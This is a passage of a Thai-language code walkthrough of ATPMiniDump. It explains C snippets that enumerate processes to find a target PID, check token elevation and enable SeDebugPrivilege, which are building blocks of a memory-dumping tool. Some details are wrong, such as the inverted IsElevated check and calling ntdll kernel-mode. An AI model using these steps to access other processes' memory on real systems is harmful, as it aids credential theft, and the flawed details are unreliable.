ฟังก์ชัน `ZwQuerySystemInformation()` มีพารามิเตอร์ทั้งหมด 4 ตัว ซึ่งมีความหมายดังนี้

- พารามิเตอร์ `SystemInformationClass` ประเภท `SYSTEM_INFORMATION_CLASS` เป็นพารามิเตอร์สำหรับระบุประเภทของข้อมูลของระบบที่จะฟังก์ชันนี้ในการดึง โดยค่าของพารามิเตอร์จะต้องเป็นค่าใดค่าหนึ่งจากประเภทของข้อมูล [`SYSTEM_INFORMATION_CLASS`](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/class.htm)
- พารามิเตอร์ `SystemInformation` ประเภท `PVOID` เป็นพารามิเตอร์สำหรับระบุตัวแปรพอยน์เตอร์ซึ่งชี้ไปยังตำแหน่งของบัฟเฟอร์ที่ฟังก์ชันจะเก็บข้อมูผลลัพธ์เมื่อทำงานเสร็จสิ้น
- พารามิเตอร์ `SystemInformationLength` ประเภท `ULONG` เป็นพารามิเตอร์สำหรับระบุขนาดของบัฟเฟอร์ที่พารามิเตอร์ `SystemInformation` ชี้ไปโดยมีหน่วยเป็นไบต์
- พารามิเตอร์ `ReturnLength` ประเภท `PULONG` เป็นพารามิเตอร์สำหรับระบุตัวแปรพอยน์เตอร์ซึ่งชี้ไปยังตำแหน่งบัฟเฟอร์ที่ฟังก์ชันจะเก็บข้อมูลขนาดของผลลัพธ์การทำงานจริง พารามิเตอร์นี้จะถูกใช้เพื่อตรวจสอบว่าการกำหนดค่าในพารามิเตอร์ `SystemInformationLength` นั้นสอดคล้องกับค่าในพารามิเตอร์ `ReturnLength` หรือไม่ ในกรณีที่ค่าที่ระบุในพารามิเตอร์ `SystemInformationLength` ไม่เพียงพอ ฟังก์ชันจะมีการส่งค่ากลับไปฟังก์ชันซึ่งเรียกใช้ว่ามีการทำงานที่ผิดพลาด

การเรียกใช้ฟังก์ชัน `ZwQuerySystemInformation()` มีการระบุอากิวเมนต์ที่น่าสนใจเข้าไปเพียงอากิวเมนต์เดียวคือที่ตำแหน่งพารามิเตอร์ `SystemInformationClass` ซึ่งถูกระบุค่าเป็น `SystemProcessInformation` ซึ่งประเภทของข้อมูลของระบบเมื่อถูกระบุหรือถูกเรียกหา ค่าที่เราจะได้รับจะมีลักษณะเป็นอาเรย์ซึ่งเก็บข้อมูลของโปรเซสเอาไว้

> **SystemProcessInformation**
>
> An array of SYSTEM_PROCESS_INFORMATION structures, one for each process running in the system.
>
> These structures contain information about the resource usage of each process, including the number of handles used by the process, the peak page-file usage, and the number of memory pages that the process has allocated. 
> 
> — *[ZwQuerySystemInformation function parameters](https://docs.microsoft.com/en-us/windows/win32/sysinfo/zwquerysysteminformation#parameters)*

ทั้งนี้ถ้าเราสังเกตดูให้ดีในการเรียกใช้ฟังก์ชัน `ZwQuerySystemInformation()` พารามิเตอร์ `SystemInformation` ซึ่งควรถูกระบุเพื่อจัดเก็บข้อมูลกลับไม่มีการระบุค่าใด ๆ เอาไว้เลย พารามิเตอร์ที่ดูเหมือนจะมีการรับข้อมูลมีเพียงพารามิเตอร์เดียวคือ `uReturnLength` ซึ่งรับค่าขนาดของผลลัพธ์ออกมาเก็บไว้ จากนั้นจึงมีการตรวจสอบด้วยค่าประเภท `NTSTATUS` เพื่อให้แน่ใจว่าฟังก์ชันทำงานไม่ล้มเหลว อย่างไรก็ตามเฉลยของการเรียกใช้ฟังก์ชัน `ZwQuerySystemInformation()` ก็อยู่ไม่ใกล้ไม่ไกลจากโค้ดส่วนปัจจุบัน ซึ่งก็คืออีกไม่กี่บรรทัดต่อจากนี้ครับ

หลังจากมีการเรียกใช้ `ZwQuerySystemInformation()` จนได้ค่าขนาดของผลลัพธ์ของประเภทข้อมูล `SystemProcessInformation` มาเก็บไว้ที่ `uReturnLength` แล้ว เราจะเห็นการใช้ค่าใน `uReturnLength` ในโค้ดด้านล่าง

```cpp
LPVOID pBuffer = NULL;
SIZE_T uSize = uReturnLength;
status = NtAllocateVirtualMemory(
  GetCurrentProcess(), // ProcessHandle
  &pBuffer, // *BaseAddress
  0, // ZeroBits
  &uSize, // RegionSize
  MEM_COMMIT, // AllocationType
  PAGE_READWRITE // Protect
);
if (status != 0) {
  return FALSE;
}

status = ZwQuerySystemInformation(
  SystemProcessInformation,  // SystemInformationClass
  pBuffer, // SystemInformation
  uReturnLength, // SystemInformationLength
  &uReturnLength // ReturnLength
  );
	if (status != 0) {
		return FALSE;
	}
```

ค่า `uReturnLength` ที่เก็บค่าขนาดของประเภทข้อมูล `SystemProcessInformation` ซึ่งเป็นผลลัพธ์ของการฟังก์ชัน `ZwQuerySystemInformation()` ทุกจัดเก็บไว้ในตัวแปรใหม่ประเภท `SIZE_T` ชื่อ `uSize` พร้อมๆ กับการสร้างตัวแปรใหม่ในประเภท `LPVOID` ชื่อ `pBuffer` ซึ่งถูกกำหนดค่าเป็น `NULL` ตัวแปรใหม่ทั้งสองนี้ถูกนำมาใช้เป็นพารามิเตอร์ของฟังก์ชัน `NtAllocateVirtualMemory()` ซึ่งปรากฎในลำดับต่อมา โดยฟังก์ชันถูกเตรียมพร้อมในลักษณะของ function pointer เอาไว้อยู่แล้วซึ่งทำให้เราสามารถใช้งานฟังก์ชันนี้ได้ทันที

ฟังก์ชัน `NtAllocateVirtualMemory()` เป็นฟังก์ชันสำหรับการจองและจัดการพื้นที่ในหน่วยความจำของโปรเซส โดยพารามิเตอร์ที่มีความสำคัญต่อกการทำงานของโปรแกรมมีดังต่อไปนี้

- พารามิเตอร์ `ProcessHandle` เป็นพารามิเตอร์ซึ่งมีไว้ให้เราระบุโปรเซสที่เราจะใช้ฟังก์ชัน `NtAllocateVirtualMemory()` เข้าไปจองหน่วยความจำ ในทีนี้เราจะเห็นการใช้ฟังก์ชัน `GetCurrentProcess()` เพื่อให้ได้มาซึ่ง process handle ของโปรเซสปัจจุบันซึ่งบ่งชี้ให้เห็นว่าการจองพื้นที่หน่วยความจำที่กำลังจะเกิดขึ้นนั้นอยู่ในขอบเขตของโปรเซสปัจจุบัน
- พารามิเตอร์ `*BaseAddress` ซึ่งเป็นตัวแปรแบบพอยน์เตอร์ที่จะเก็บตำแหน่งของหน่วยความจำซึ่งเป็นผลลัพธ์จากการทำงานของฟังก์ชัน `NtAllocateVirtualMemory()` ในที่นี้โค้ดมีการระบุตำแหน่งของตัวแปร `pBuffer` ซึ่งถูกสร้างไว้ก่อนหน้า
- พารามิเตอร์ `RegionSize` เป็นพารามิเตอร์ซึ่งใช้ในการระบุขนาดในหน่วยไบต์ของพื้นที่ในหน่วยความจำที่จะมีการจอง ในที่นี้เราจะเห็นการนำค่า `uSize` ซึ่งมีที่มาจากตัวแปร `uReturnLength` ของการเรียกฟังก์ชัน `ZwQuerySystemInformation()` มาใช้งาน

พารามิเตอร์อื่นๆ ซึ่งถูกระบุในการเรียกใช้ฟังก์ชัน อาทิ `AllocationType`, `ZeroBits` และ `Protect` เป็นพารามิเตอร์เสริมซึ่งใช้เพื่อระบุคุณลักษณะอื่นๆ ของพื้นที่หน่วยความจำที่ทำการจอง ผลลัพธ์ของการเรียกใช้ฟังก์ชัน `NtAllocateVirtualMemory()` จะถูกตรวจสอบว่าฟังก์ชันทำงานเสร็จสิ้นหรือไม่ หากไม่เสร็จสิ้นฟังก์ชันจะถูกหยุดการทำงาน แต่หากฟังก์ชันนี้ทำงานเสร็จสิ้น เราก็จะได้พื้นที่ใหม่ในหน่วยความจำของโปรเซสปัจจุบันตามขนาดที่เราระบุ และสามารถเรียกใช้ได้ผ่านตำแหน่งของหน่วยความจำซึ่งถูกเก็บอยู่ในตัวแปร `pBuffer`

ต่อมาฟังก์ชัน `ZwQuerySystemInformation()` จะถูกเรียกใช้เป็นครั้งที่สองด้วยจุดประสงค์ที่ต่างออกไป เนื่องจากในตอนนี้เรามีพื้นที่ว่างในหน่วยความจำพร้อมใช้งานแล้ว เราก็สามารถระบุพื้นที่ดังกล่าวให้กับฟังก์ชัน `ZwQuerySystemInformation()` เพื่อจัดเก็บข้อมูลต่อได้ สังเกตว่าธรรมชาติของภาษาซีนั้น ก่อนจะมีการดำเนินการเรียกหาข้อมูลใดๆ เราจำเป็นจะต้องจัดเตรียมพื้นที่เอาไว้จัดเก็บผลลัพธ์เสมอ ซึ่งนั่นคือสิ่งที่เราเห็นในการเรียกใช้ฟังก์ชัน `ZwQuerySystemInformation()` ครั้งแรกกับการเรัยกใช้ฟังก์ชัน `NtAllocationVirtualMemory()` ครับ

การเรียกใช้ฟังก์ชัน `ZwQuerySystemInformation()` ในครั้งที่สองจะสังเกตได้อย่างชัดเจนว่าตัวแปร `pBuffer` นั้นถูกใส่ไว้ในตำแหน่งของพารามิเตอร์ `SystemInformation` เพื่อเป็นตำแหน่งที่จะเก็บข้อมูลผลลัพธ์ของการทำงาน โดยเมื่อสิ้นสุดการทำงานแล้ว พื้นที่หน่วยความจำซึ่งถูกอ้างอิงด้วยตัวแปร `pBuffer` จะเก็บข้อมูลประเภท `SystemProcessInformation` หรืออธิบายอีกอย่างได้คือข้อมูลของรายละเอียดของโปรเซสที่กำลังทำงานอยู่ในระบบ (หากใครสนใจว่า `pBuffer` เก็บข้อมูลในลักษณะใด ก็สามาถดีบั๊กเพื่อดูค่าในตัวแปรนี้ได้ตามสะดวกครับ)

```cpp
_RtlEqualUnicodeString RtlEqualUnicodeString = (_RtlEqualUnicodeString) GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlEqualUnicodeString");
if (RtlEqualUnicodeString == NULL) {
  return FALSE;
}
```

โค้ดส่วนต่อมาคือการสร้าง function pointer ให้กับฟังก์ชันชื่อ `RtlEqualUnicodeString()` ด้วยรูปแบบที่เราคุ้นเคยกันดี ฟังก์ชัน `RtlEqualUnicodeString()` มีการทำงานตรงตัวตามชื่อของมันการรับค่าอินพุตเข้าไปสองค่าในประเภท `PCUNICODE_STRING` หรือสตริงซึ่งใช้ยูนิโค้ด จากนั้นทำการเปรียบเทียบว่าสตริงทั้งสองค่านั้นเป็นสตริงเดียวกันหรือไม่ หากเป็นสตริงเดียวกันฟังก์ชัน `RtlEqualUnicodeString()` จะส่งผลลัพธ์เป็น `TRUE` และเป็น `FALSE` หากไม่เป็นสตริงเดียวกัน

```cpp
PSYSTEM_PROCESSES pProcInfo = (PSYSTEM_PROCESSES) pBuffer;
```

ในส่วนถัดมาเราจะเห็นโค้ดในลักษณะที่เหมือนกับการทำ function pointer แต่ในความคิดของผมนั้น มันจะสามารถเข้าใจได้ง่ายกว่าถ้าเราอธิบายโค้ดในบรรทัดด้านบนว่าเป็นการเอาค่าผลลัพธ์จากการทำงานของฟังก์ชัน `ZwQuerySystemInformation()` นั้นมาทำการแปลงให้อยู่ในประเภทข้อมูลที่ชื่อ `PSYSTEM_PROCESSES` และเก็บผลลัพธ์ที่ได้ไว้ในตัวแปรชื่อ `pProcInfo` การทำแบบนี้มีจุดประสงค์เพื่อให้เราสามารถเข้าถึงค่าใน `pBuffer` ได้อย่างเป็นรูปแบบตามโครงสร้างที่ประเภทข้อมูลนี้พึงมี เราสามารถดูรายละเอียดเพิ่มเติมของ `PSYSTEM_PROCESSES` ได้จาก[ไฟล์ `ATPMiniDump.h` ที่บรรทัดที่ 87 ครับ](https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.h#L87)

```cpp
typedef struct _SYSTEM_PROCESSES {
	ULONG NextEntryDelta;
	ULONG ThreadCount;
	ULONG Reserved1[6];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ProcessName;
	KPRIORITY BasePriority;
	HANDLE ProcessId;
	HANDLE InheritedFromProcessId;
} SYSTEM_PROCESSES, *PSYSTEM_PROCESSES;
```

เมื่อผ่านการแปลงประเภทแล้ว เราสามารถมโนต่อได้เลยว่าหากเราเรียกดูข้อมูลโดยใช้การอ้างเป็น `&pProcInfo.ProcessName` เราก็จะได้รายการของชื่อโปรเซสจากผลลัพ์ของ `SystemProcessInformation` นั่นเอง

ในตอนนี้เรามีรายการข้อมูลของโปรเซสที่ทำงานอยู่ในระบบอยู่แล้ว ด้วยจุดประสงค์ของฟังก์ชัน `GetPID()` คือการหาค่า process ID และค่านำเข้าของฟังก์ชันซึ่งคือ `pWinVerInfo.ProcName` เราน่าจะพอเดาสิ่งที่จะเกิดขึ้นต่อไปได้แล้วว่าสิ่งที่จะเกิดขึ้นต่อไปในการทำงานของฟังก์ชันนี้นั้นคือการนำข้อมูลใน `pProcInfo` ซึ่งเก็บรายการโปรเซสที่ทำงานอยู่ทั้งหมดในระบบมาเปรียบเทียบชื่อกับข้อมูลในตัวแปร `pWinVerInfo.ProcName` ด้วยฟังก์ชัน `RtlEqualUnicodeString()` ซึ่งถูกสร้างขึ้นมาแต่ยังไม่ถูกเรียกใช้ เมื่อมีเปรียบเทียบชื่อจนเจอแล้ว เราก็สามารถคาดเดาได้ว่าค่า `pProcInfo.ProcessId` ของโปรเซสที่มีชื่อตรงกับที่เราต้องการจะถูกย้ายมาเก็บไว้ใน `pWinVerInfo.hTargetPID` ที่มีการ initialize ค่าเป็น `NULL` เอาไว้ตั้งแต่เริ่มต้นฟังก์ชัน

โค้ดส่วนถัดไปอธิบายสิ่งที่เราคาดเดาไว้ด้านบนครับ

```cpp
do {
		if (RtlEqualUnicodeString(&pProcInfo->ProcessName, &pWinVerInfo->ProcName, TRUE)) {
			pWinVerInfo->hTargetPID = pProcInfo->ProcessId;
			break;
		}
		
		pProcInfo = (PSYSTEM_PROCESSES)(((LPBYTE)pProcInfo) + pProcInfo->NextEntryDelta);
} while (pProcInfo);
```

มีการเรียกใช้ `do-while` ในการไล่หาข้อมูลใน `pProcInfo` และเราจะเห็นการขยับค่าใน `pProcInfo` ด้วยการเอาตำแหน่งข้อมูลปัจจุบันมารวมระยะห่างของข้อมูลในรายการโปรเซสซึ่งถัดไปด้วย `pProcInfo.NextEntryDelta` ด้วย ในกรณีที่มีโปรเซสซึ่งมีชื่อตรงกับที่เราต้องการ ค่า process ID ก็จะถูกนำไปเก็บไว้ `pWinVerInfo.hTargetPID` แต่กรณีที่ไม่พบแล้วนั้น ค่าใน `pWinVerInfo.hTargetPID` ก็จะยังคงเป็นค่า `NULL` ตามที่ iniitalize ไว้ในตอนแรกเหมือนเดิม

```cpp
status = NtFreeVirtualMemory(GetCurrentProcess(), &pBuffer, &uSize, MEM_RELEASE);

if (pWinVerInfo->hTargetPID == NULL) {
  return FALSE;
}

return TRUE;
```

ส่วนสุดท้ายของฟังก์ชัน `GetPID()` คือการเรียกใช้ฟังก์ชัน `NtFreeVirtualMemory()` เพื่อจัดการคืนพื้นที่ของหน่วยความจำซึ่งถูกจองไว้ด้วยฟังก์ชัน `NtAllocateVirtualMemory()` หลังจากนั้นฟังก์ชันจะมีการตรวจสอบค่าผลลัพธ์ว่า `pWinVerInfo.hTargetPID` ยังมีค่าเป็น `NULL` อยู่หรือไม่ หากใช่ก็จะมีการส่งค่า `FALSE` ออก แต่หากไม่ก็จะมีการส่งหา `TRUE` ออก เป็นอันจับการทำงานของฟังก์ชัน `GetPID()` ครับ

### IsElevated Function

> ดูโค้ดของฟังก์ชัน `IsElevated()` แบบเต็มได้[ที่นี่](https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.c#L80)

ฟังก์ชัน `IsEleveated()` เป็นฟังก์ชันที่จะส่งออกข้อมูลประเภท `BOOL` ไม่มีการรับอากิวเมนต์ใดๆ เข้ามาประมวลผลในฟังก์ชัน และจะส่งออกค่าออกเป็น `TRUE` หรือ `FALSE` เท่านั้น

จุดประสงค์ของฟังก์ชัน `IsElevated()` คือการตรวจสอบ access token ของโปรเซสปัจจุบันว่าได้มีการกำหนดประเภทของค่าใน access token ว่ามีการตั้งค่าที่ถูกต้องแล้วหรือไม่ โดยค่าใน access token ที่ฟังก์ชันนี้จะทำการตรวจสอบคือค่าใน struct ชื่อ `TOKEN_ELEVATION` ซึ่งค่าใน access token ที่ระบุสิทธิ์ของผู้ดูแลระบบ

ฟังก์ชันทำการตรวจสอบ access token ปัจจุบันที่โปรเซส `ATPMiniDump.exe` มีอยู่ผ่านฟังก์ชัน `OpenAccessToken()` โดยฟังก์ชัน `OpenAccessToken()` มีการรับค่า process handle ซึ่งเป็นเป้าหมายของการตรวจสอบ สิทธิ์และรูปแบบในการเข้าถึง access token ของโปรเซสดังกล่าวและพอยน์เตอร์ซึ่งชี้ไปยังตัวแปรที่จะใช้เพื่อจัดเก็บตำแหน่งของ access token handle โดยในกรณีนี้เราจะสามารถสังเกตได้ว่าฟังก์ชันมีการใช้ process handle ที่เป็นผลลัพธ์จากการเรียกใช้ฟังก์ชัน `GetCurrentProcess()` ซึ่งจะได้ผลลัพธ์เป็น process handle ของโปรเซสปัจจุบัน

```cpp
if (!OpenProcessToken(
        GetCurrentProcess(), // ProcessHandle
        TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, // DesiredAccess
        &hToken // TokenHandle
        )
    ) {
    TOKEN_ELEVATION Elevation = { 0 };
    DWORD cbSize = sizeof(TOKEN_ELEVATION);
}
```

ในกรณีที่ฟังก์ชัน `OpenProcessToken()` ทำงานเสร็จสิ้นและไม่เกิดข้อผิดพลาด ฟังก์ชันจะมีการสร้างตัวแปร `Elevation` จาก struct `TOKEN_ELEVATION` และมีการสร้างตัวแปร `cbSize` โดยมีการกำหนดค่าให้จัดเก็บขนาดของ struct `TOKEN_ELEVATION` เอาไว้ในรูปแบบ DWORD

หากสงสัยว่าตัวแปรสองตัวนี้ถูกสร้างขึ้นมาเพราะอะไร โค้ดด้านล่างคือคำตอบครับ

```cpp
if (GetTokenInformation(
      hToken, // TokenHandle
      TokenElevation, // TokenInformationClass
      &Elevation, // TokenInformation
      sizeof(Elevation), // TokenInformationLength
      &cbSize // ReturnLength
      ) 
    ) {
  fRet = Elevation.TokenIsElevated;
}
```

ฟังก์ชัน `GetTokenInformation()` คือฟังก์ชันถัดมาซึ่งถูกเรียกใช้ หน้าที่ของฟังก์ชันนี้คือการเรียกหาข้อมูลแบบระบุประเภทซึ่งอยู่ใน access token โดยเราสามารอธิบายการทำงานของฟังก์ชัน `GetTokenInformation()` ด้วยพารามิเตอร์ที่ถูกระบุมาไว้ก่อนแล้วได้ดังนี้

ให้ดึงข้อมูลจาก access token โดยที่

- ถ้าดึงมาได้แล้วให้เก็บตำแหน่งของ access token ไปที่ access token handler ชื่อ `hToken`
- ประเภทของข้อมูลที่เราจะดึงจาก access token คือประเภท `TOKEN_ELEVATION`
- ถ้าดึงมาได้แล้วให้ข้อมูลที่ดึงมาเก็บไว้ที่ตำแหน่งที่ของตัวแปร `Elevation`
- ขนาดของตัวแปรสำหรับเก็บข้อมูลซึ่งในที่นี้คือตัวแปร `Elevation` มีขนาดคือ `sizeof(Elevation)`
- ค่าที่ดึงมาจะต้องมีขนาดไม่เกิน `&cbSize` ซึ่งก็คือลิมิตขนาดของข้อมูลประเภท `TOKEN_ELEVATION`

หากอ่านตามความสำคัญของพารามิเตอร์ด้านบน เราจะพบว่าหากฟังก์ชันทำงานสำเร็จ เราสามารถดูข้อมูลหรือผลลัพธ์ที่แท้จริงได้จากตัวแปร `Elevation` ที่ถูกกำหนด struct เอาไว้แล้วให้สอดคล้องกับข้อมูลประเภท `TOKEN_ELEVATION`

อ้างอิงจาก [TOKEN_ELEVATION structure](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_elevation) ในกรณีที่โปรเซสมีสิทธิ์ของผู้ดูแลระบบอยู่แล้ว ค่าภายใน struct `TOKEN_ELEVATION` ที่มีชื่อว่า `TokenIsElevated` จะต้องไม่เป็นศูนย์ ฟังก์ชัน `IsElevated()` จะใช้วิธีการส่งค่าภายใน `Elevation.TokenIsElevated` ออกไปเป็นผลลัพธ์ ทั้งนี้ในกรณีที่การทำงานของฟังก์ชันหลุดออกจากเงื่อนทั้ง `OpenProcessToken()` หรือ `GetTokenInformation()` ฟังก์ชัน `TokenIsElevated()` จะส่งค่าออกมาเป็น `FALSE` หรือ `0` ทันที

### SetDebugPrivilege Function

> ดูโค้ดของฟังก์ชัน `SetDebugPrivilege()` แบบเต็มได้[ที่นี่](https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.c#L96)

ฟังก์ชัน `SetDebugPrivilege()` เป็นฟังก์ชันที่จะส่งออกข้อมูลประเภท `BOOL` ไม่มีการรับอากิวเมนต์ใดๆ เข้ามาประมวลผลในฟังก์ชัน และจะส่งออกค่าเป็น `TRUE` หรือ `FALSE` เท่านั้น

จุดประสงค์ของฟังก์ชัน `SetDebugPrivilege()` คือการกำหนดสิทธิ์ของโปรเซส `ATPMiniDump.exe` ให้มีสิทธิ์ `SeDebugPrivilege` ซึ่งเป็นสิทธิ์ของระบบปฏิบัติการที่ทำให้สามารถตรวจสอบและเปลี่ยนแปลงการทำงานของข้อมูลในหน่วยความจำของโปรเซสใดๆ ซึ่งมีบัญชีผู้ใช้งานอื่นเป็นเจ้าของ รวมไปถึงดำเนินการด้วยสิทธิ์ของระบบบางอย่างได้ กระบวนการกำหนดสิทธิ์จะทำโดยการแก้ไขค่าเกี่ยวกับสิทธิ์ที่โปรเซส `ATPMiniDump.exe` มีอยู่เพื่อให้ได้สิทธิ์ตามต้องการ โดยค่าดังกล่าวในสภาพแวดล้อมของระบบปฏิบัติการ Windows นั้นจะมีชื่อเรียกว่า access token

ค่า access token เป็นค่าซึ่งได้มาเมื่อผู้ใช้งานเข้าสู่ระบบโดยจะถูกถือครองโดยผู้ใช้งานและโปรเซสที่ถูกสร้างโดยผู้ใช้งาน ค่าที่อยู่ใน access token จะกำหนดสิทธิ์ที่ผู้ใช้งานและโปรเซสของผู้ใช้งานสามารถดำเนินการภายในระบบ ระบบจะทำการตรวจสอบ access token ดังกล่าวว่ามีสิทธิ์เพียงพอที่จะดำเนินการในเรื่องอย่างใดอย่างหนึ่งหรือไม่

ฟังก์ชันทำการตรวจสอบ access token ปัจจุบันที่โปรเซส `ATPMiniDump.exe` มีอยู่ผ่านฟังก์ชัน `OpenAccessToken()` เช่นเดียวกับที่ปรากฎในฟังก์ชัน `IsElevated()`

```cpp
if (!OpenProcessToken(
        GetCurrentProcess(), // ProcessHandle
        TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, // DesiredAccess
        &hToken // TokenHandle
        )
    ) {
    return FALSE;
}
```

ค่าใน access token ประกอบไปด้วยข้อมูลหลายส่วนรวมไปถึงส่วนซึ่งจะใช้ในการระบุสิทธิ์คือค่า struct ที่มีชื่อว่า `SEP_TOKEN_PRIVILEGES` กระบวนการในลำดับต่อไปคือการสร้างตัวแปร `TokenPrivileges` จาก struct `TOKEN_PRIVILEGES` และจะมีการกำหนดค่าซึ่งจะส่งผลให้โปรเซสที่มี access token ปัจจุบันนั้นมีสิทธิ์ `SeDebugPrivilege` การกำหนดค่าให้กับสมาชิกในตัวแปร `TokenPrivileges` มีตามลักษณะของ struct ดังนี้

- ระบุจำนวนของรูปแบบ privilege ที่ไว้ที่ `TokenPrivileges.PrivilegeCount` ในที่นี้ค่าดังกล่าวจะถูกระบุเป็น `1` เนื่องจากรูปแบบของ privilege ที่จะถูกกำหนดลงไปนั้นมีอยู่รูปแบบเดียว
- ระบุประเภทของรูปแบบ privilege ที่จะกำหนด เราจะเห็น conditional operator ของภาษาซีในส่วนนี้คือเครื่องหมาย `?` การระบุประเภทดังกล่าวจะทำการกำหนดค่า `SE_PRIVILEGE_ENABLED` ซึ่งเป็นการกำหนดค่า privilege ในกรณีที่เงื่อนไข `TokenPrivileges.Privileges[0].Attribute` มีอยู่จริง (ซึ่งมีจริงอยู่แล้ว) ค่า `SE_PRIVILEGE_ENABLED` เมื่อถูกใส่ไปใน access token แล้วจะถือว่าโปรเซสที่มี access token มีสิทธิ์ `SeDebugPrivilege` ในทันที

```cpp
TokenPrivileges.PrivilegeCount = 1;
TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;
```

นอกเหนือจากส่วนของค่าใน access token เกี่ยวกับสิทธิ์ ค่าภายใน access token ยังต้องประกอบไปด้วยค่าเฉพาะตามโครงสร้างของ access token ที่ระบบกำหนด ค่าเฉพาะดังกล่าวซึ่งถูกกำหนดให้นำมาใช้ตาม[โครงสร้างของ access token](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-token) ที่ระบบกำหนดคือค่า locally unique identifier (LUID) ซึ่งจะแตกต่างกันไปเมื่อมีการบูตระบบขึ้นมา โปรแกรมจะมีการเรียกใช้ฟังก์ชัน `LookupPrivilegeValueW()` เพื่อนำค่า LUID ดังกล่าวมาใส่ในแอตทริบิวต์ของตัวแปร `TokenPrivileges` ตามที่ระบบกำหนดไว้ ในกรณีที่การดำเนินในขั้นตอนนี้ไม่เสร็จสมบูรณ์ โปรแกรมจะหยุดการทำงานทันที

```cpp
LPWSTR lpwPriv = L"SeDebugPrivilege";
if (!LookupPrivilegeValueW(
        NULL, // lpSystemName
        (LPCWSTR)lpwPriv, // lpName
        &TokenPrivileges.Privileges[0].Luid // lpLuid
        )
    ) {
    CloseHandle(hToken);
    return FALSE;
}
```

เมื่อองค์ประกอบของ access token สมบูรณ์แล้ว โปรแกรมจะนำ access token ใหม่ไปใช้งานผ่านฟังก์ชัน `AdjustTokenPrivilges()` ซึ่งจะรับตำแหน่งของ access token handle ปัจจุบันของโปรเซสไป และรับค่า access token ใหม่จากตัวแปร `TokenPrivileges` ไปปรับใช้ ในกรณีที่การดำเนินในขั้นตอนนี้ไม่เสร็จสมบูรณ์ โปรแกรมจะหยุดการทำงานทันที


```cpp
if (!AdjustTokenPrivileges(
        hToken, // TokenHandle
        FALSE, // DisableAllPrivileges
        &TokenPrivileges,  // NewState
        sizeof(TOKEN_PRIVILEGES), // BufferLength
        NULL, // PreviousState
        NULL // ReturnLength
        )
    ) {
    CloseHandle(hToken);
    return FALSE;
}
```

เมื่อดำเนินการเสร็จสิ้น โปรแกรมจะดำเนินการปิด access token handle ที่มีการใช้งานอยู่ ก่อนจะส่งสถานะการทำงานกลับไปยังฟังก์ชันซึ่งทำการเรียกใช้ฟังก์ชัน `SetDebugPrivilege()`

## Notes

### Loading External Function with Function Pointer

จุดสังเกตที่น่าสนใจอย่างหนึ่งในโค้ดของโครงการ ATPMiniDump คือการเรียกใช้งาน Windows API ในระดับ kernel อยู่หลายส่วนตามตัวอย่างด้านล่างซึ่งเป็นโค้ดในฟังก์ชัน `wmain()`

```cpp
_RtlGetVersion RtlGetVersion = (_RtlGetVersion) GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlGetVersion");

if (RtlGetVersion == NULL) {
    return FALSE;
}
```

โค้ดด้านบนมีจุดมุ่งหมายในการพยายามเรียกใช้ฟังก์ชัน `RtlGetVersion()` จากไลบรารี `ntdll.dll` ที่ป็น kernel-mode API โดยในขณะเดียวกันก็มี user-mode API ที่ชื่อ `GetVersionEx()` ซึ่งมีลักษณะและรูปแบบผลลัพธ์ใกล้เคียงกัน

อย่างไรก็ตามเนื่องจากไลบรารี `ntdll.dll` ซึ่งเก็บ kernel-mode API หลายรายการเอาไว้ให้เรียกใช้ได้นั้นไม่ได้เป็นไลบรารีพื้นฐานที่มักถูกเรียกใช้หรือมีความพร้อมใช้งานโดยทั่วไป ดังนั้นการจะทำให้ฟังก์ชัน `RtlGetVersion()` สามารถถูกเรียกใช้ได้โดยโค้ดในฟังก์ชัน `wmain()` จึงจำเป็นต้องมีการเพิ่มขั้นตอนหรือกลไกในการเตรียมฟังก์ชัน `RtlGetVersion()` ให้สามารถเรียกใช้ได้ขึ้นมา อย่างไรก็ตามก่อนที่เราจะพูดถึงกลไกลในส่วนนี้ การได้รู้เหตุผลว่าทำไมเราถึงต้องมีกลไกนี้อาจจะช่วยให้เราเข้าใจการทำงานในโค้ดตรงส่วนนี้มากขึ้นครับ

```cpp
_RtlGetVersion RtlGetVersion = (_RtlGetVersion) GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlGetVersion");
```

หากเราพยายามทำความเข้าใจโค้ดด้านบน เราจะเห็นลำดับการทำงานตามขั้นตอนดังนี้

1. เพื่อที่จะใช้ฟังก์ชัน `RtlGetVersion()` ในไลบรารี `ntdll.dll` ที่ยังไม่สามารถเรียกใช้ได้ทันที โค้ดจึงต้องทำการสร้างการเชื่อมโยงไปยังไลบรารี `ntdll.dll` ก่อนด้วยฟังก์ชัน `GetModuleHandle()` พร้อมระบุไลบรารีที่จะเรียกหา
2. ผลลัพธ์ของการใช้ `GetModuleHandle(L"ntdll.dll")` จะทำให้ได้ handle ที่เก็บตำแหน่งที่อยู่ของโมดูลที่เราเรียกในหน่วยความจำ โดย handle นี้คือจุดที่ทำให้เราเชื่อมโยงไปยังไลบรารีที่เราต้องการได้
3. หลังจากได้ตำแหน่งของไลบรารีหรือโมดูล `ntdll.dll` ในหน่วยความจำมาแล้ว โค้ดมีการเรียกใช้ฟังก์ชัน `GetProcAddress()` ซึ่งทำหน้าที่ในการหาตำแหน่งจองฟังก์ชันในไลบรารีหรือโมดูล โดยในที่นี้ฟังก์ชัน `GetProcAddress()` จะถูกใช้เพื่อเรียกหาตำแหน่งของฟังก์ชัน `RtlGetVersion()` ซึ่งอยู่ในไลบรารี `ntdll.dll`

